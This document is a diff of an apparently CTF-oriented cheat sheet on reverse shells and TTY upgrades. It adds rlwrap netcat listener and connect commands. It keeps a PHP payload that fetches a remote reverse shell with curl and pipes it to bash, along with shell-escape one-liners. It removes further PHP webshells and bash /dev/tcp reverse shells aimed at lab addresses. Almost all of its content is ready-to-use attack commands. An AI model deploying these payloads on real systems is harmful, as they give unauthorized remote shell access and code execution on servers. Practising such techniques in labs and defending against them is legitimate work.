@@ -10,7 +10,20 @@ description: Teletypewriters and Shells
 
 ### <mark style="color:purple;">Ncat</mark>
 
-* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enable line editing and history.</mark>
+* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enable line editing and history:</mark>
+
+{% code title="Listener" %}
+```bash
+rlwrap nc -lvnp <port>
+```
+{% endcode %}
+
+{% code title="Connect to the target" %}
+```bash
+rlwrap nc 10.10.10.131 6200
+```
+{% endcode %}
+
 * <mark style="color:purple;">In order to have a full</mark> <mark style="color:orange;">**`TTY`**</mark> <mark style="color:purple;">**follow this steps:**</mark>
 
 #### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>
@@ -189,7 +202,7 @@ s.close()' > shell.py
 ```
 {% endcode %}
 
-* <mark style="color:purple;">**Writes a file to the server, which fetches and executes a remote reverse shell via**</mark>**&#x20;**<mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">**:**</mark>
+* <mark style="color:purple;">**Fetches and executes a remote reverse shell via**</mark>**&#x20;**<mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">**:**</mark>
 
 ```php
 <?php system("curl http://attacker_ip/reverseshell | bash"); ?>
@@ -226,28 +239,3 @@ exec "/bin/sh"                # (From within IRB)
 !sh                           # (From within nmap)
 ```
 
-
-
-PHP
-
-```bash
-#For index.php files
-<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
-
-#To copy inside a file
-echo '<?php system("curl <http://10.10.14.16:443/rev.sh> | bash"); ?>' > hola.php
-
-```
-
-BASH + PHP
-
-```bash
-#Create the rev shell first
-
-#!/bin/bash
-
-bash -i >& /dev/tcp/10.10.14.16/443 0>&1
-
-#Copy it in to file with at http server
-echo '<?php system("curl <http://10.10.14.16:80/hey> | bash"); ?>'
-```
